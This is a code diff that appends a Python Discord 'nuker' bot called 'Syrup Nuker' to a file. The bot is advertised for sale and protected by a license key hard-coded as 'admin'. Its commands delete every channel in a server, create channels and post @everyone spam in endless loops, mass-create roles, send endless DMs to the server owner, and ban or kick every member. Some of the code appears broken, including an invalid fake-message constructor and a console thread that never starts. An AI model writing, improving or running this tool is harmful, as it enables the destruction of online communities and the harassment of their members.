@@ -127,3 +127,151 @@ def get_token():
                 else: continue
 if __name__ == '__main__':
     get_token()
+
+
+import ctypes
+import requests
+import discord
+from discord.ext import commands
+from colorama import Fore
+from pystyle import Colors, Colorate
+import time
+import random
+import string
+import os
+import threading
+import asyncio
+import requests
+import os
+import requests
+from pystyle import Center
+
+# Function to get PC name
+def get_pc_name():
+    return os.getenv('COMPUTERNAME')
+
+def set_console_title(title):
+    ctypes.windll.kernel32.SetConsoleTitleW(title)
+
+# Change the console title at the start of the program
+set_console_title("Syrup Nuker - Starting...")
+
+
+def get_bot_token():
+    return input(Fore.CYAN + 'Input Bot Token: ')
+
+client = commands.Bot(command_prefix=".",
+                      intents=discord.Intents.all())
+
+async def run_bot_command(command):
+    fake_message = discord.Message(content=command)
+    await client.process_commands(fake_message)
+
+def console_input_thread():
+    while True:
+        command = input("Enter a bot command (e.g., .nuke): ")
+        if command.startswith("."):
+            asyncio.run(run_bot_command(command))
+        else:
+            print("Invalid command. Commands must start with '.'")
+
+@client.event
+async def on_ready():
+    set_console_title(f"Syrup Nuker - Logins: {len(client.guilds)} ")  # Set console title with server count
+
+    print(Colorate.Horizontal(Colors.red_to_purple, """
+    
+     ██████▓██   ██▓ ██▀███   █    ██  ██▓███  
+   ▒██    ▒ ▒██  ██▒▓██ ▒ ██▒ ██  ▓██▒▓██░  ██▒
+   ░ ▓██▄    ▒██ ██░▓██ ░▄█ ▒▓██  ▒██░▓██░ ██▓▒
+     ▒   ██▒ ░ ▐██▓░▒██▀▀█▄  ▓▓█  ░██░▒██▄█▓▒ ▒
+   ▒██████▒▒ ░ ██▒▓░░██▓ ▒██▒▒▒█████▓ ▒██▒ ░  ░
+   ▒ ▒▓▒ ▒ ░  ██▒▒▒ ░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒ ▒▓▒░ ░  ░
+   ░ ░▒  ░ ░▓██ ░▒░   ░▒ ░ ▒░░░▒░ ░ ░ ░▒ ░     
+   ░  ░  ░  ▒ ▒ ░░    ░░   ░  ░░░ ░ ░ ░░       
+         ░  ░ ░        ░        ░              
+            ░ ░                                
+                               5$/copy
+                          Written by XeniDev
+        """,1))
+    
+    print(Fore.CYAN + "Logged in as {}".format(client.user))
+
+    server_list = ["SERVER LOGINS:"]
+    for guild in client.guilds:
+        server_list.append(f"    {guild.name}")
+
+    print(Fore.WHITE + "\n".join(server_list))
+
+LicenseKey = input(Fore.CYAN + 'Input License Key: ')
+if LicenseKey == "admin":
+    print(Fore.CYAN + "Key is Valid!")
+    print(Fore.CYAN + "Validating connection to the server...")
+    time.sleep(2)
+else:
+    print(Fore.RED + "Invalid Key!")
+    print(Fore.RED + "Press Enter to quit!")
+    input("")
+    exit(123)
+
+@client.command()
+async def nuke(ctx):
+    await ctx.message.delete()
+    await ctx.guild.edit(name="TRASHED BY SYRUP LOL")
+    try:
+        for channels in ctx.guild.channels:
+            await channels.delete()
+            print("deleted {}".format(channels))
+    except:
+        print("Can't delete {}".format(channels))
+
+    while True:
+        await ctx.guild.create_text_channel("NUKE BY SYRUP")
+
+@client.event
+async def on_guild_channel_create(channel):
+    while True:
+        await channel.send("@everyone @here NUKED BY SYRUP SQUAD LMFAO! https://share.creavite.co/dZFiowKAbCVLEsG0.gif")
+
+@client.command()
+async def rolespam(ctx):
+    await ctx.message.delete()
+    for i in range(100):
+        await ctx.guild.create_role(name="FUCKED BY SYRUP !!!")
+
+@client.command()
+async def ownerspam(ctx):
+    owner = ctx.guild.owner
+    while True:
+        await owner.send("imagine getting nuked! :skull:")
+
+@client.command()
+async def guildname(ctx, *, newname):
+    await ctx.message.delete()
+    await ctx.guild.edit(name=newname)
+
+@client.command()
+async def massban(ctx):
+    try:
+        for members in ctx.guild.members:
+            await members.ban(reason="NUKED BY SYRUP ")
+            print(Fore.GREEN + f"banned {members}")
+    except:
+        print(Fore.RED + f"can't ban {members}")
+
+@client.command()
+async def kickall(ctx):
+    try:
+        for members in ctx.guild.members:
+            await members.kick(reason="NUKED BY SYRUP ")
+            print(Fore.GREEN + f"kicked {members}")
+    except:
+        print(Fore.RED + f"can't kick {members}")
+
+if __name__ == "__main__":
+    bot_token = get_bot_token()
+    asyncio.run(client.start(bot_token))
+
+    input_thread = threading.Thread(target=console_input_thread)
+    input_thread.start()
+
